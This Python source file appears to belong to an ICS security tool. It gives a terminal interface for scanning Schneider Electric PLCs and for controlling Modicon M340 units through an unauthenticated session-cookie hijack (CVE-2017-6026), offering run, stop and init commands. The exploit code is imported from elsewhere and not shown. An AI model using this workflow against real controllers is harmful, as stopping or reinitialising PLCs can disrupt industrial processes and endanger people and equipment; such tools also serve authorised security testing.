"""Rich-based TUI for Schneider Electric PLC scanning and session control."""

from __future__ import annotations

from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt
from rich.table import Table

console = Console(stderr=False)


# ------------------------------------------------------------------
# Public TUI entry points
# ------------------------------------------------------------------

def run_session_panel(ip: str) -> None:
    """Show device info obtained via session hijack (CVE-2017-6026).

    Grabs an unauthenticated session cookie and retrieves device details,
    then optionally sends a control command.

    Args:
        ip: Target Schneider M340 IP address.
    """
    from scadaver.vendors.schneider.session_hijack import (
        control_plc,
        get_device_info,
        get_session_cookie,
    )

    with console.status(f"[cyan]Grabbing session cookie from {ip}…"):
        cookie = get_session_cookie(ip)

    if cookie is None:
        console.print(f"[red][!] Failed to obtain session cookie from {ip}[/red]")
        return

    console.print(f"[green]✓ Session cookie: {cookie}[/green]")

    with console.status("[cyan]Fetching device info…"):
        info = get_device_info(ip, cookie)

    if info:
        table = Table(show_header=False, expand=True, header_style="bold cyan")
        table.add_column("Field", style="dim", width=22)
        table.add_column("Value", style="white")
        for key, val in info.items():
            table.add_row(str(key), str(val))
        console.print(Panel(table, title=f"[bold]{ip}[/bold] — Schneider M340", border_style="cyan"))

    action = Prompt.ask(
        "[bold]PLC action: [run] | [stop] | [init] | [q] skip[/bold]",
        choices=["run", "stop", "init", "q"],
        default="q",
    )
    if action != "q":
        with console.status(f"[cyan]Sending {action.upper()}…"):
            result = control_plc(ip, cookie, action)
        console.print(f"  [green]Result: {result}[/green]")


def run_scan_table(devices: list[dict]) -> None:
    """Display a list of discovered Schneider devices as a Rich table.

    Args:
        devices: List of device dicts from scan() or scan_ip().
    """
    if not devices:
        console.print("[yellow]No Schneider devices found.[/yellow]")
        return

    table = Table(
        title=f"Schneider Devices ({len(devices)} found)",
        header_style="bold cyan",
    )
    table.add_column("IP", style="white")
    table.add_column("Product Name", style="green")
    table.add_column("Type / Model", style="white")
    table.add_column("Firmware", style="dim")
    table.add_column("MAC", style="dim")

    for dev in devices:
        table.add_row(
            dev.get("ip", dev.get("IP", "?")),
            dev.get("product_name", dev.get("ProductName", "?")),
            dev.get("product_range", dev.get("type", "?")),
            dev.get("firmware", dev.get("FirmwareVersion", "")),
            dev.get("mac", dev.get("MAC", "")),
        )
    console.print(table)


def run_flash_led(ip: str) -> None:
    """Flash the LED on a Schneider M340 PLC.

    Args:
        ip: Target PLC IP address.
    """
    from scadaver.vendors.schneider.flash_led import flash_led

    confirm = Prompt.ask(
        f"[bold]Flash LED on {ip}?[/bold]",
        choices=["y", "n"],
        default="n",
    )
    if confirm != "y":
        return

    with console.status(f"[cyan]Flashing LED on {ip}…"):
        flash_led(ip)
    console.print("[green]Flash LED command sent.[/green]")
